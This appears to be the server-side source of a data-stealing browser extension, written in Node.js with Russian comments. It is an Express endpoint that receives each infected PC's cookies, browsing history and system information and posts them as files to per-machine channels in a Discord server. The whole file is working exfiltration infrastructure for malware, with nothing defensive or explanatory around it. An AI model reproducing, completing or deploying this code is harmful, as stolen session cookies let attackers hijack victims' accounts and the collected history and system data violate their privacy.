import express from "express";
import { Client, GatewayIntentBits } from "discord.js";

const app = express();
app.use(express.json({ limit: "10mb" }));

// Переменные окружения (Railway -> Settings -> Variables)
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";

// Запускаем Discord бота
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });

bot.once("ready", () => {
  console.log(`✅ Бот вошёл как ${bot.user.tag}`);
});

// Хелпер: получить или создать категорию
async function getOrCreateCategory(guild, name) {
  let category = guild.channels.cache.find(
    (c) => c.type === 4 && c.name === name
  );
  if (!category) {
    category = await guild.channels.create({
      name,
      type: 4,
    });
  }
  return category;
}

// Хелпер: получить или создать текстовый канал
async function getOrCreateTextChannel(guild, name, parentId) {
  let channel = guild.channels.cache.find(
    (c) => c.type === 0 && c.name === name && c.parentId === parentId
  );
  if (!channel) {
    channel = await guild.channels.create({
      name,
      type: 0,
      parent: parentId,
    });
  }
  return channel;
}

// Маршрут для загрузки данных от расширения
app.post("/upload", async (req, res) => {
  try {
    const { pcName, cookies, history, systemInfo } = req.body;

    const guild = await bot.guilds.fetch(GUILD_ID);
    const category = await getOrCreateCategory(guild, CATEGORY_NAME);
    const channel = await getOrCreateTextChannel(guild, pcName, category.id);

    // Отправляем файлы
    await channel.send({
      files: [
        {
          attachment: Buffer.from(JSON.stringify(cookies, null, 2)),
          name: `${pcName}-cookies.json`,
        },
        {
          attachment: Buffer.from(JSON.stringify(history, null, 2)),
          name: `${pcName}-history.json`,
        },
        {
          attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)),
          name: `${pcName}-system.json`,
        },
      ],
    });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));

// Запуск бота
bot.login(DISCORD_BOT_TOKEN);
